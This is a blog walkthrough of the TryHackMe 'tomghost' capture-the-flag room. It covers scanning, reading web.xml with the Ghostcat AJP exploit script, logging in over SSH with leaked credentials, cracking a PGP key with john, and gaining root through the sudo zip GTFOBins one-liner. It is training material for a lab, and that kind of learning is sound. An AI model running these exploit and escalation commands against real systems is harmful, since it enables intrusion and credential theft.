---
title: "tomghost - TryHackMe"
author: Ludovic COULON
date: 2020-05-12
hero: ./images/hero.jpeg
excerpt: "Writeup for the tomghost challenge"
---

[TryHackMe | tomghost](https://tryhackme.com/room/tomghost)

<div className="Image__Medium">
  <img src="https://i.imgur.com/fR0jVuM.png" alt="blog_image" />
</div>

**Are you able to complete the challenge?**

The machine may a take up to 5 minutes to boot and configure.

### Setup

```bash
nmap -sV -sC -vv 10.10.68.237
```

```bash
Discovered open port 53/tcp on 10.10.68.237
Discovered open port 22/tcp on 10.10.68.237
Discovered open port 8080/tcp on 10.10.68.237
Discovered open port 8009/tcp on 10.10.68.237
```

```bash
22/tcp   open  ssh        syn-ack OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 f3:c8:9f:0b:6a:c5:fe:95:54:0b:e9:e3:ba:93:db:7c (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDQvC8xe2qKLoPG3vaJagEW2eW4juBu9nJvn53nRjyw7y/0GEWIxE1KqcPXZiL+RKfkKA7RJNTXN2W9kCG8i6JdVWs2x9wD28UtwYxcyo6M9dQ7i2mXlJpTHtSncOoufSA45eqWT4GY+iEaBekWhnxWM+TrFOMNS5bpmUXrjuBR2JtN9a9cqHQ2zGdSlN+jLYi2Z5C7IVqxYb9yw5RBV5+bX7J4dvHNIs3otGDeGJ8oXVhd+aELUN8/C2p5bVqpGk04KI2gGEyU611v3eOzoP6obem9vsk7Kkgsw7eRNt1+CBrwWldPr8hy6nhA6Oi5qmJgK1x+fCmsfLSH3sz1z4Ln
|   256 dd:1a:09:f5:99:63:a3:43:0d:2d:90:d8:e3:e1:1f:b9 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBOscw5angd6i9vsr7MfCAugRPvtx/aLjNzjAvoFEkwKeO53N01Dn17eJxrbIWEj33sp8nzx1Lillg/XM+Lk69CQ=
|   256 48:d1:30:1b:38:6c:c6:53:ea:30:81:80:5d:0c:f1:05 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIGqgzoXzgz5QIhEWm3+Mysrwk89YW2cd2Nmad+PrE4jw

53/tcp   open  tcpwrapped syn-ack

8009/tcp open ajp13 syn-ack Apache Jserv (Protocol v1.3)
| ajp-methods:
|_  Supported methods: GET HEAD POST OPTIONS

8080/tcp open http syn-ack Apache Tomcat 9.0.30
|_http-favicon: Apache Tomcat
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-open-proxy: Proxy might be redirecting requests
|_http-title: Apache Tomcat/9.0.30
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

After trying to exploit the Apache Tomcat, I realize that I was wrong about that, so I tried the other port 8009 Apache Jserv I search on github for one exploit and I found this.

[00theway/Ghostcat-CNVD-2020-10487](https://github.com/00theway/Ghostcat-CNVD-2020-10487)

```bash
python3 ajpShooter.py http://10.10.68.237:8080 8009 /WEB-INF/web.xml read
# URL:PORT + Jserv PORT + /WEB-INF/web.xml read
```

<div className="Image__Medium">
  <img src="https://imgur.com/FtZHUNJ.png" alt="blog_image" />
</div>

```bash
skyfuck:8730281lkjlkjdqlksalks
# Let's try to ssh this
```

<div className="Image__Medium">
  <img src="https://imgur.com/fsV6mGi.png" alt="blog_image" />
</div>

### #1 Compromise this machine and obtain user.txt

<div className="Image__Medium">
  <img src="https://imgur.com/XCy6lRK.png" alt="blog_image" />
</div>

```bash
skyfuck@ubuntu:~$ cd /home
skyfuck@ubuntu:/home$ ls
merlin  skyfuck
skyfuck@ubuntu:/home$ cd merlin/
skyfuck@ubuntu:/home/merlin$ ls
user.txt
skyfuck@ubuntu:/home/merlin$ cat user.txt
THM{GhostCat_1s_so_cr4sy}
```

### #2 Escalate privileges and obtain root.txt

If you going back to the skyfuck's home directory you will see the "credential.pgp" "tryhackme.asc"

let's scp them to our machine to crack them.

```bash
➜  TryHackMe scp skyfuck@10.10.68.237:/home/skyfuck/credential.pgp .
skyfuck@10.10.68.237 password:
credential.pgp

➜  TryHackMe scp skyfuck@10.10.68.237:/home/skyfuck/tryhackme.asc .
skyfuck@10.10.68.237 password:
tryhackme.asc
```

For this i'll use gpg2john

```bash
➜  TryHackMe sudo gpg2john tryhackme.asc > bopme

File tryhackme.asc
➜  TryHackMe cat bopme
tryhackme:$gpg$*17*54*3072*713ee3f57cc950f8f89155679abe2476c62bbd286ded0e049f886d32d2b9eb06f482e9770c710abc2903f1ed70af6fcc22f5608760be*3*254*2*9*16*0c99d5dae8216f2155ba2abfcc71f818*65536*c8f277d2faf97480:::tryhackme <stuxnet@tryhackme.com>::tryhackme.asc
```

Now the fun part crack the gpg !

```bash
➜  TryHackMe sudo john bopme --wordlist=/usr/share/wordlists/rockyou.txt
Using default input encoding: UTF-8
Loaded 1 password hash (gpg, OpenPGP / GnuPG Secret Key [32/64])
Cost 1 (s2k-count) is 65536 for all loaded hashes
Cost 2 (hash algorithm [1:MD5 2:SHA1 3:RIPEMD160 8:SHA256 9:SHA384 10:SHA512 11:SHA224]) is 2 for all loaded hashes
Cost 3 (cipher algorithm [1:IDEA 2:3DES 3:CAST5 4:Blowfish 7:AES128 8:AES192 9:AES256 10:Twofish 11:Camellia128 12:Camellia192 13:Camellia256]) is 9 for all loaded hashes
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status

"alexandru"        (tryhackme)

1g 0:00:00:00 DONE (2020-05-12 14:27) 10.00g/s 10720p/s 10720c/s 10720C/s chinita..alexandru
Use the "--show" option to display all of the cracked passwords reliably
Session completed
```

Nice we have the password

```bash
alexandru
```

Now let's decrypt the pgp file, but first let's import the tryhackme.asc

```bash
➜  TryHackMe gpg --import tryhackme.asc
gpg: key 8F3DA3DEC6707170: "tryhackme <stuxnet@tryhackme.com>" not changed
gpg: key 8F3DA3DEC6707170: secret key imported
gpg: key 8F3DA3DEC6707170: "tryhackme <stuxnet@tryhackme.com>" not changed
gpg: Total number processed: 2
gpg:              unchanged: 2
gpg:       secret keys read: 1
gpg:   secret keys imported: 1

# password => alexandru
```

```bash
➜  TryHackMe gpg --decrypt credential.pgp
gpg: WARNING: cipher algorithm CAST5 not found in recipient preferences
gpg: encrypted with 1024-bit ELG key, ID 61E104A66184FBCC, created 2020-03-11
      "tryhackme <stuxnet@tryhackme.com>"
merlin:asuyusdoiuqoilkda312j31k2j123j1g23g12k3g12kj3gk12jg3k12j3kj123j
```

Nice we have the merlin's ssh password

<div className="Image__Medium">
  <img src="https://imgur.com/zrEzvSs.png" alt="blog_image" />
</div>

Let's root the machine !

[zip | GTFOBins](https://gtfobins.github.io/gtfobins/zip/)

```bash
merlin@ubuntu:~$ TF=$(mktemp -u)
merlin@ubuntu:~$ sudo zip $TF /etc/hosts -T -TT 'sh #'
  adding: etc/hosts (deflated 31%)
$ id
uid=0(root) gid=0(root) groups=0(root)
$ cd /root/
$ ls
root.txt  ufw
$ cat root.txt
THM{Z1P_1S_FAKE}

```

<center>
  <a href="https://tryhackme.com/p/boperXD" target="_blank">
    <img src="https://i.imgur.com/p0h00A1.png" alt="TryhackMeProfile" />
  </a>
</center>
